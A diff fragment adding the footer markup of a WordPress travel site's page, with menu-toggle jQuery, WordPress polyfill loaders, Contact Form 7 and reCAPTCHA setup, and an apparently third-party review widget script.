+            $(".sub-menu:first", expand).show(300);
+            expand.addClass('active');
+        }
+    });
+
+    $('.btn-show-menu').click(function(){
+        $('.main-menu-mobile').slideToggle();
+    })
+});
+
+</script>
+
+</body>
+<script type='text/javascript' src='https://goasiatravel.com/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=7.4.4' id='wp-polyfill-js'></script>
+<script type='text/javascript' id='wp-polyfill-js-after'>
+( 'fetch' in window ) || document.write( '<script src="https://goasiatravel.com/wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js?ver=3.0.0"></scr' + 'ipt>' );( document.contains ) || document.write( '<script src="https://goasiatravel.com/wp-includes/js/dist/vendor/wp-polyfill-node-contains.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.DOMRect ) || document.write( '<script src="https://goasiatravel.com/wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.URL && window.URL.prototype && window.URLSearchParams ) || document.write( '<script src="https://goasiatravel.com/wp-includes/js/dist/vendor/wp-polyfill-url.min.js?ver=3.6.4"></scr' + 'ipt>' );( window.FormData && window.FormData.prototype.keys ) || document.write( '<script src="https://goasiatravel.com/wp-includes/js/dist/vendor/wp-polyfill-formdata.min.js?ver=3.0.12"></scr' + 'ipt>' );( Element.prototype.matches && Element.prototype.closest ) || document.write( '<script src="https://goasiatravel.com/wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js?ver=2.0.2"></scr' + 'ipt>' );( 'objectFit' in document.documentElement.style ) || document.write( '<script src="https://goasiatravel.com/wp-includes/js/dist/vendor/wp-polyfill-object-fit.min.js?ver=2.3.4"></scr' + 'ipt>' );
+</script>
+<script type='text/javascript' id='contact-form-7-js-extra'>
+/* <![CDATA[ */
+var wpcf7 = {"api":{"root":"https:\/\/goasiatravel.com\/wp-json\/","namespace":"contact-form-7\/v1"},"cached":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://goasiatravel.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.5.6' id='contact-form-7-js'></script>
+<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?render=6LdbzNQUAAAAAMeRyKogVD7OJ2iPaKgZOZIxo-Qv&#038;ver=3.0' id='google-recaptcha-js'></script>
+<script type='text/javascript' id='wpcf7-recaptcha-js-extra'>
+/* <![CDATA[ */
+var wpcf7_recaptcha = {"sitekey":"6LdbzNQUAAAAAMeRyKogVD7OJ2iPaKgZOZIxo-Qv","actions":{"homepage":"homepage","contactform":"contactform"}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://goasiatravel.com/wp-content/plugins/contact-form-7/modules/recaptcha/index.js?ver=5.5.6' id='wpcf7-recaptcha-js'></script>
+<script type='text/javascript' src='https://goasiatravel.com/wp-includes/js/wp-embed.min.js?ver=5.7.10' id='wp-embed-js'></script>
+</html>
+<script async src="https://www.jscache.com/wejs?wtype=selfserveprop&uniq=334&locationId=2234933&lang=en_US&rating=true&nreviews=5&writereviewlink=true&popIdx=true&iswide=false&border=true&display_version=2" data-loadtrk onload="this.loadtrk=true"></script>
